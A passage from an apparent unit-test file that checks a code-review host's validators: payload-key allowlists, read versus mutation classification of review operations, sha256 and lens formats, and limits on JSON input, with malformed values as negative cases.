    expect(() => assertReviewOrder(0)).not.toThrow();
    expect(() => assertReviewOrder(-1)).toThrow(ValidationError);
    expect(() => assertReviewOrder(33)).toThrow(ValidationError);
    expect(() => assertReviewCorrectionLines(1)).not.toThrow();
    expect(() => assertReviewCorrectionLines(0)).toThrow(ValidationError);
    expect(() => assertReviewSha256(`sha256:${"a".repeat(64)}`)).not.toThrow();
    expect(() => assertReviewSha256("deadbeef")).toThrow(ValidationError);
    expect(() => assertOptionalBoolean(true, "committedOnly")).not.toThrow();
    expect(() => assertOptionalBoolean(undefined, "committedOnly")).not.toThrow();
    expect(() => assertOptionalBoolean("yes", "committedOnly")).toThrow(ValidationError);
  });

  test("maintainer authorization is LF-only JSON", () => {
    expect(() => assertMaintainerAuthorization('{"approve":true}')).not.toThrow();
    expect(() => assertMaintainerAuthorization('{\n"approve":true\n}')).not.toThrow();
    for (const bad of ["", "not json", "{\r}", `{\u0000}`, "x".repeat(65537)]) {
      expect(() => assertMaintainerAuthorization(bad)).toThrow(ValidationError);
    }
  });

  test("review operations are orchestrator-only mutations with exact keys", () => {
    const operations = [
      "reviewStart",
      "reviewCaptureResult",
      "reviewCaptureUnachievable",
      "reviewAcknowledgeApproved",
      "reviewCaptureCorrectionPlan",
      "reviewCaptureRefuter",
      "reviewCaptureValidation",
      "reviewValidate",
      "reviewRecover",
    ];
    for (const operation of operations) {
      expect(hostToolAccess(operation)).toBe("mutation");
      expect(HOST_MUTATION_OPERATIONS).toContain(operation);
      expect(HOST_READ_OPERATIONS).not.toContain(operation);
    }
    expect(() => assertPayloadKeys("reviewStart", { projectDir: "/repo", focus: "risk" })).not.toThrow();
    expect(() => assertPayloadKeys("reviewStart", { projectDir: "/repo", cwd: "/tmp" })).toThrow(ValidationError);
    expect(() => assertPayloadKeys("reviewRecover", { projectDir: "/repo", agent: "opencode" })).toThrow(ValidationError);
    expect(() => assertPayloadKeys("reviewCaptureResult", { projectDir: "/repo", input: "-", order: 1 })).not.toThrow();
    expect(() => assertPayloadKeys("reviewValidate", { projectDir: "/repo", gate: "pre-pr" })).not.toThrow();
  });
});
});

describe("host review lens-context and inline capture validators", () => {
  test("reviewLensContext is a read and its payload keys are allowlisted", () => {
    expect(hostToolAccess("reviewLensContext")).toBe("read");
    expect(HOST_READ_OPERATIONS).toContain("reviewLensContext");
    expect(HOST_MUTATION_OPERATIONS).not.toContain("reviewLensContext");
    expect(() =>
      assertPayloadKeys("reviewLensContext", {
        projectDir: "/repo",
        repositoryContext: "Repo-Context",
        lineage: "Lineage-TOKEN",
        target: "Target-TOKEN",
        expectedRevision: `sha256:${"a".repeat(64)}`,
        lens: "review-risk",
      }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("reviewLensContext", { projectDir: "/repo", lens: "review-risk", extra: 1 }),
    ).toThrow(ValidationError);
  });

  test("review lens is an exact four-value domain", () => {
    for (const lens of ["review-risk", "review-resilience", "review-readability", "review-reliability"]) {
      expect(() => assertReviewLens(lens)).not.toThrow();
    }
    for (const evil of ["risk", "review-nonsense", "", "-review-risk", "REVIEW-RISK"]) {
      expect(() => assertReviewLens(evil)).toThrow(ValidationError);
    }
  });

  test("inputJson is allowlisted and must be non-empty valid JSON without NUL", () => {
    expect(() =>
      assertPayloadKeys("reviewCaptureResult", { projectDir: "/repo", inputJson: '{"a":1}' }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("reviewCaptureResult", { projectDir: "/repo", inputJsonX: "x" }),
    ).toThrow(ValidationError);
    const max = 512 * 1024;
    expect(() => assertReviewInputJson('{\n  "a": 1\n}', max)).not.toThrow();
    for (const bad of ["", "not json", "{", "]", '{a:' + String.fromCharCode(0) + '}', '"' + "a".repeat(max) + '"']) {
      expect(() => assertReviewInputJson(bad, max)).toThrow(ValidationError);
    }
    expect(() => assertReviewInputJson(1, max)).toThrow(ValidationError);
  });
});
